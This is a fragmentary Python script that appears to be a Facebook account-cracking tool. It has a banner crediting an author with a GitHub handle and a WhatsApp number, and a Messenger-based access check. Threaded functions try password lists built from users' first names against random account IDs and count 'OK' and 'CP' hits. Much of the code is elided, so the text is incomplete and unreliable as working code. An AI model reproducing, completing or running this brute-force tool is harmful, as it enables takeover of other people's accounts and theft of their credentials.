...
░ ░ ▒  ░ ░ ▒  ▒   ░▒ ░ ▒░
  ░ ░    ░ ░  ░   ░░   ░ 
    ...
    │ [✓] AUTHOR   : Black ldr            │
    │ [✓] GITHUB   : blackldr                │
    │ [✓] WHATSAPP : +8801980471227         │
    │ [✓] VERSION  : 0.1                    │
    │ [✓] POWER BY : \033[1;32mblack \033[1;37m            │
    └───────────────────────────────────────┘""")                                           
  ...
  os.system(f'xdg-open {tan}://https://m.me/tamimahamad.tamim.54')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}:https://m.me/tamimahamad.tamim.54?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Ldr-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Ldr] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        print(f'\033[1;32m Random Started  ')
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Tamim, Ripa, Love ')
                code = input(' First name : ')
                print(' Name Example : Ahamed, Akter, Love')
